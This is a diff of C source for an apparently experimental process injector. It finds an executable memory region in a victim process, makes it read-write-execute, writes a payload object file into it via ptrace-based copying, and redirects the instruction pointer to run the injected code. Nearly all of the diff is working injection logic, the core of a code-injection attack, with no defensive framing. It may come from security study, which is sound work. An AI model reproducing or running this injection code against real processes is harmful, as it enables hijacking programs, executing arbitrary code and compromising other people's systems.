@@ -217,15 +217,15 @@ int main(int argc, char* argv[])
 			tempRetVal = 0;  // TEST OTHER MEMORY SECTIONS
 			while (tmpPM_ptr)
 			{
-				if (1 == tmpPM_ptr->is_w)
-				// if (1 == tmpPM_ptr->is_x)
+// 				if (1 == tmpPM_ptr->is_w)
+				if (1 == tmpPM_ptr->is_x)
 				{
 					if (!tempRetVal)
 					{
 						// pmparser_print(tmpPM_ptr, 0);  // DEBUGGING
 						// fprintf(stdout, "\n");  // DEBUGGING
-						fprintf(stdout, "[*] Found rw-p PID memory\n");  // DEBUGGING
-					    // fprintf(stdout, "[*] Found r-xp PID memory\n");  // DEBUGGING
+// 						fprintf(stdout, "[*] Found rw-p PID memory\n");  // DEBUGGING
+					    fprintf(stdout, "[*] Found r-xp PID memory\n");  // DEBUGGING
 						break;  // Found one
 					}
 					else
@@ -292,8 +292,8 @@ int main(int argc, char* argv[])
 
 			// 6.2. Read the payload in
 			// payloadContents = fread_a_file(payloadFilename);
-			// payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_1.o");
-			payloadContents = code;
+			payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_1.o");
+// 			payloadContents = code;
 			
 			if (!payloadContents)
 			{
@@ -303,8 +303,8 @@ int main(int argc, char* argv[])
 			else
 			{
 				// 6.3. Change the permissions on the memory
-				// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
-				// 	                          MROAD_PROT_READ | MROAD_PROT_WRITE | MROAD_PROT_EXEC);
+				tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
+					                          MROAD_PROT_READ | MROAD_PROT_WRITE | MROAD_PROT_EXEC);
 
 				// getchar();  // DEBUGGING
 				if (tempRetVal)
@@ -319,14 +319,14 @@ int main(int argc, char* argv[])
 					fprintf(stdout, "[*] Modified mapped memory permissions\n");  // DEBUGGING
 					// getchar();  // DEBUGGING
 					// 6.4. Write the payload to memory
-					// if (copy_local_to_remote(vicPID->pidNum, \
-					// 						 tmpPM_ptr->addr_start, \
-					// 						 payloadContents, \
-					// 						 strlen(payloadContents)))
 					if (copy_local_to_remote(vicPID->pidNum, \
 											 tmpPM_ptr->addr_start, \
 											 payloadContents, \
-											 sizeof(code)/sizeof(*code)))
+											 strlen(payloadContents)))
+// 					if (copy_local_to_remote(vicPID->pidNum, \
+// 											 tmpPM_ptr->addr_start, \
+// 											 payloadContents, \
+// 											 sizeof(code)/sizeof(*code)))
 					{
 						HARKLE_ERROR(injector, main, copy_local_to_remote failed);
 						success = false;
@@ -341,22 +341,22 @@ int main(int argc, char* argv[])
 	}
 
 	// DEBUGGING
-	void *buf;
-	if (true == success)
-	{
-		buf = mmap(0,sizeof(code),PROT_READ|PROT_WRITE|PROT_EXEC,
-                   MAP_PRIVATE|MAP_ANON,-1,0);
-    	memcpy(buf, code, sizeof(code));
-    	// fprintf(stdout, "Writing:\t%s", (char*)buf);  // DEBUGGING
-	}
+// 	void *buf;
+// 	if (true == success)
+// 	{
+// 		buf = mmap(0,sizeof(code),PROT_READ|PROT_WRITE|PROT_EXEC,
+//                    MAP_PRIVATE|MAP_ANON,-1,0);
+//     	memcpy(buf, code, sizeof(code));
+//     	// fprintf(stdout, "Writing:\t%s", (char*)buf);  // DEBUGGING
+// 	}
 
 	// 6. Update RIP to point to the injected code
 	if (true == success)
 	{
 		// 6.1. Modify existing registers to reflect the new RIP
-		newRegs.rip = (unsigned long long)buf;
+// 		newRegs.rip = (unsigned long long)buf;
 		// newRegs.rip = (unsigned long long)code;
-		// newRegs.rip = (unsigned long long)tmpPM_ptr->addr_start;
+		newRegs.rip = (unsigned long long)tmpPM_ptr->addr_start;
 		
 		// 6.2. Update the victim PID's process registers
 		ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &newRegs);
